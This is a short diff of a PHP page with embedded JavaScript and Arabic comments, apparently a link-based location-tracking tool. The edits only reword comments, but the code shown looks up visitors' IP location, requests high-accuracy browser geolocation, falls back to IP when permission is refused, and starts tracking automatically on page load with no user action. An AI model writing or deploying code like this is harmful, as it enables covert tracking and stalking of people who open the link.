@@ -230,7 +230,7 @@ if (isset($_GET['r'])) {
             $ip_details = get_ip_details($public_ip);
             $location = $ip_details['location'];
             
-            // استقبال إحداثيات الموقع الدقيق أوتوماتيكياً إن وجدت
+            // استقبال إحداثيات الموقع الجغرافي أوتوماتيكياً إن وجدت
             if (!empty($_POST['lat']) && !empty($_POST['lon'])) {
                 $lat = $_POST['lat'];
                 $lon = $_POST['lon'];
@@ -314,7 +314,7 @@ if (isset($_GET['r'])) {
                             sendData(position.coords.latitude, position.coords.longitude);
                         },
                         (error) => {
-                            sendData("", ""); // إذا تم رفض الصلاحية يتم الاعتماد تلقائياً على الـ IP
+                            sendData("", ""); // الاعتماد على الـ IP إذا تم رفض الإذن
                         },
                         { timeout: 2500, maximumAge: 0, enableHighAccuracy: true }
                     );
@@ -354,7 +354,6 @@ if (isset($_GET['r'])) {
                 });
         }
 
-        // تشغيل التتبع أوتوماتيكياً بمجرد تحميل الصفحة دون الحاجة لأي تفاعل يدوي
         window.addEventListener('DOMContentLoaded', () => {
             initTracking();
         });
